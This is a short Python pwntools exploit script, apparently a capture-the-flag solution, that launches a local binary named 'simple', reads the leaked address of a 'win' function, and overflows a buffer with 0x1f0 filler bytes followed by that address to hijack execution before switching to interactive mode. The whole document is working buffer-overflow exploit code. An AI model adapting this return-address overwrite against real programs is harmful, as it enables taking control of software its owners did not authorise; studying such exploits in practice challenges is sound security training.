from pwn import *

def B2S(Bytes):
    return ''.join(map(chr, list(Bytes))) 

r = process('./simple')

r.recvuntil(' @ ')
win = int(r.recvline().strip(), 16)
gdb.attach(r)
r.sendline('a'*0x1f0+B2S(p64(win)))
r.interactive()
